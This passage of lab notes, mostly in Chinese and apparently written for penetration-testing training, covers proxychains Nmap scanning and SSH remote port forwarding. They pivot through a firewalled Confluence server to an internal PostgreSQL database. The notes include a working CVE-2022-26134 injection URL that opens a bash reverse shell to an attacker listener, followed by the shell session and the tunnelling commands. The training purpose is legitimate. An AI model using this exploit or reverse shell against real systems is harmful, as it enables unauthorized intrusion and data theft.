Reconnecting with SMB1 for workgroup listing.
[proxychains] Strict chain  ...  192.168.147.63:9999  ...  172.16.147.217:139  ...  OK
[proxychains] Strict chain  ...  192.168.147.63:9999  ...  172.16.147.217:139 ^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B ...  OK
do_connect: Connection to 172.16.147.217 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
> 成功連線 HRSHARES

#### 5. 透過 Proxychains 進行 Nmap 掃描
>[!Note]
>Nmap has a built-in --proxies option. However, according to its [documentation](https://nmap.org/book/man-bypass-firewalls-ids.html), it's "still under development" and not suitable for port scanning. As such, we use Proxychains again in this example.

```
┌──(chw㉿CHW)-[~]
└─$ proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.147.217
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/aarch64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-03 12:50 EST
Initiating Parallel DNS resolution of 1 host. at 12:50
Completed Parallel DNS resolution of 1 host. at 12:50, 0.07s elapsed
DNS resolution of 1 IPs took 0.07s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:50
Scanning 172.16.147.217 [20 ports]
[proxychains] Strict chain  ...  192.168.147.63:9999  ...  172.16.147.217:5900 <--socket error or timeout!
Scanned at 2025-03-03 12:50:14 EST for 245s

PORT     STATE  SERVICE       REASON
21/tcp   closed ftp           conn-refused
22/tcp   closed ssh           conn-refused
23/tcp   closed telnet        conn-refused
25/tcp   closed smtp          conn-refused
53/tcp   closed domain        conn-refused
80/tcp   closed http          conn-refused
110/tcp  closed pop3          conn-refused
111/tcp  closed rpcbind       conn-refused
135/tcp  open   msrpc         syn-ack
139/tcp  open   netbios-ssn   syn-ack
143/tcp  closed imap          conn-refused
443/tcp  closed https         conn-refused
445/tcp  open   microsoft-ds  syn-ack
993/tcp  closed imaps         conn-refused
995/tcp  closed pop3s         conn-refused
1723/tcp closed pptp          conn-refused
3306/tcp closed mysql         conn-refused
3389/tcp open   ms-wbt-server syn-ack
5900/tcp closed vnc           conn-refused
8080/tcp closed http-proxy    conn-refused

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 244.76 seconds
```

>[!Tip]
>在預設情況下，Proxychains 配置了非常高的 time-out 。這會使 port scanning 變得非常慢。\
>降低 Proxychains 設定檔中的 `tcp_read_time_out` 和 `tcp_connect_time_out` 可以使 Proxychains 加快連接埠掃描時間。

### SSH Remote Port Forwarding
透過 Dynamic Port Forwarding 已經能夠在 CONFLUENCE01 的 WAN interface 上綁定的任何 port，但在 real world 的 firewalls (包含軟體與硬體) 會變成阻礙。Inbound traffic 會比 outbound traffic 限制更多。🥚 雖然 attacker 無法綁定端口讓外部直接連入，仍然可以利用 SSH 遠端轉發來繞過這些限制，建立反向通道。
這也是 SSH [remote port forwarding](https://man.openbsd.org/ssh#R) 實用的地方，attacker 可以在目標機器執行 remote shell payload，連回 attacker 監聽中的 SSH server。

[回到 LAB 範例]\
一樣使用 CVE-2022-26134 塞入 reverse shell，但環境中新增防火牆規則：`只允許 TCP 8090 Inbound; All out bound`。後端環境與 socat 相同，需要透過 5432 port 連接到 PostgreSQL database。
![image](https://hackmd.io/_uploads/By6NuJVske.png)
因為防火牆規則，我們無法在 CONFLUENCE01 上開啟監聽 port。
嘗試在 Kali 上設定 SSH server，讓 CONFLUENCE01 連回 Kali。
1. 讓 CONFLUENCE01 SSH 連線到 Kali，並在 Kali 綁定一個 port (ex. 上圖中 2345 port)
2. 所有發送到 Kali 2345 port 的請求，都會透過 SSH Tunnel 轉發到 CONFLUENCE01，然後再送到 PGDATABASE01（10.4.195.215:5432）。
3. Kali 就能存取內部的 PostgreSQL 服務，即使它原本受防火牆保護、無法直接存取。

#### 1. start the Kali SSH server
```
┌──(chw㉿CHW)-[~]
└─$ ip a
...
9: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
    link/none 
    inet 192.168.45.182/24 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 fe80::ac14:a08e:7658:5796/64 scope link stable-privacy proto kernel_ll 
       valid_lft forever preferred_lft forever
                                                                                                
┌──(chw㉿CHW)-[~]
└─$ sudo systemctl start ssh
[sudo] password for chw:
```
檢查是否成功開啟
```
┌──(chw㉿CHW)-[~]
└─$ sudo ss -ntplu
Netid     State      Recv-Q     Send-Q         Local Address:Port          Peer Address:Port    Process        
...
tcp       LISTEN     0          128                  0.0.0.0:22                 0.0.0.0:*        users:(("sshd",pid=237930,fd=3))                                                               
tcp       LISTEN     0          128                     [::]:22                    [::]:*        users:(("sshd",pid=237930,fd=4)) 
```
> listening port 22 on all interfaces for both IPv4 and IPv6.

#### 2. 建立交互式的 TTY shell
一樣在 target machine 注入 reverse shell
```
┌──(chw㉿CHW)-[~]
└─$ curl http://192.168.195.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.182/8888%200%3E%261%27%29.start%28%29%22%29%7D/
```
```
┌──(chw㉿CHW)-[~]
└─$ nc -nvlp 8888
listening on [any] 8888 ...
connect to [192.168.45.182] from (UNKNOWN) [192.168.195.63] 45516
bash: cannot set terminal process group (2665): Inappropriate ioctl for device
bash: no job control in this shell
bash: /root/.bashrc: Permission denied
confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<in$ python3 -c 'import pty; pty.spawn("/bin/bash")'   
bash: /root/.bashrc: Permission denied
confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'
</bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'   
$ 
```

#### 3. 設定 SSH remote port forward
>[!Tip]
>要讓 Target machine 透過 SSH 密碼驗證連回 Kali，在 Kali 中的 `/etc/ssh/sshd_config` 需要設定 `PasswordAuthentication yes`

```
$ ssh -N -R 127.0.0.1:2345:10.4.195.215:5432 chw@192.168.45.182
ssh -N -R 127.0.0.1:2345:10.4.195.215:5432 chw@192.168.45.182
Could not create directory '/home/confluence/.ssh'.
The authenticity of host '192.168.45.182 (192.168.45.182)' can't be established.
ECDSA key fingerprint is SHA256:Atuf88ckgvdjD92PblnxCBvzAiN1jtxNUv6woYcEmxg.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
yes
Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
chw@192.168.45.182's password: *********


```
> `-N` ：只建立 SSH 連線，不執行遠端 Shell\
`-R 127.0.0.1:2345:10.4.195.215:5432 chw@192.168.45.182`：
> - Kali 機器（192.168.45.182） 會在 127.0.0.1:2345 開啟一個端口
> - 所有發送到 127.0.0.1:2345 的流量，會透過 SSH Tunnel 轉發到 10.4.195.215:5432（PostgreSQL Server）
> - chw@192.168.45.182：SSH 連線到 Kali 機器，使用 chw 帳號

>[!Note]
>比較 `Local Port Forwarding`, `Dynamic Port Forwarding` 與 `Remote Port Forwarding`\
>![image](https://hackmd.io/_uploads/B1MxxlEjJx.png)


確認啟用狀況：
```
┌──(chw㉿CHW)-[~]
└─$ ss -ntplu
Netid   State    Recv-Q    Send-Q       Local Address:Port        Peer Address:Port   Process   
...
tcp     LISTEN   0         128                0.0.0.0:22               0.0.0.0:*                
tcp     LISTEN   0         128              127.0.0.1:2345             0.0.0.0:*                
tcp     LISTEN   0         128                   [::]:22                  [::]:*
```
> 成功打通 remote port forwarding

![image](https://hackmd.io/_uploads/H1ealg4ike.png)

#### 4. 使用 psql 登入 PGDATABASE01
在 Kali 本機利用 psql 連線 (SSH remote port forward 打通的 2345 port)
```
┌──(chw㉿CHW)-[~]
└─$ psql -h 127.0.0.1 -p 2345 -U postgres
Password for user postgres: 
psql (16.3 (Debian 16.3-1+b1), server 12.12 (Ubuntu 12.12-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off)
Type "help" for help.

postgres=# \l
                                                        List of databases
    Name    |  Owner   | Encoding | Locale Provider |   Collate   |    Ctype    | ICU Locale | ICU Rules |   Access privileges   
------------+----------+----------+-----------------+-------------+-------------+------------+-----------+-----------------------
 confluence | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |            |           | 
 hr_backup  | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |            |           | 
 postgres   | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |            |           | 
 template0  | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |            |           | =c/postgres          +
            |          |          |                 |             |             |            |           | postgres=CTc/postgres
 template1  | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |            |           | =c/postgres          +
            |          |          |                 |             |             |            |           | postgres=CTc/postgres
(5 rows)
postgres=# \c hr_backup
psql (16.3 (Debian 16.3-1+b1), server 12.12 (Ubuntu 12.12-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off)
You are now connected to database "hr_backup" as user "postgres".
hr_backup=# SELECT * FROM payroll;
 id |                 flag                 
----+--------------------------------------
  0 | ************************************
```
> `\l`: 列出所有資料庫\
> `\c hr_backup`: 切換至 hr_backup 資料庫\
> `\dt`: 查看所有 table
> ```
> hr_backup=# \dt
>          List of relations
> Schema |  Name   | Type  |  Owner   
>--------+---------+-------+----------
> public | payroll | table | postgres
>(1 row)
> ```
> `\d payroll`: 查看 table 結構
> ```
>hr_backup=# \d payroll
>                   Table "public.payroll"
> Column |       Type        | Collation | Nullable | >Default 
>--------+-------------------+-----------+----------+---------
> id     | integer           |           | not null | 
> flag   | character varying |           |          | 
>Indexes:
>    "payroll_pkey" PRIMARY KEY, btree (id)
> ```

### SSH Remote Dynamic Port Forwarding
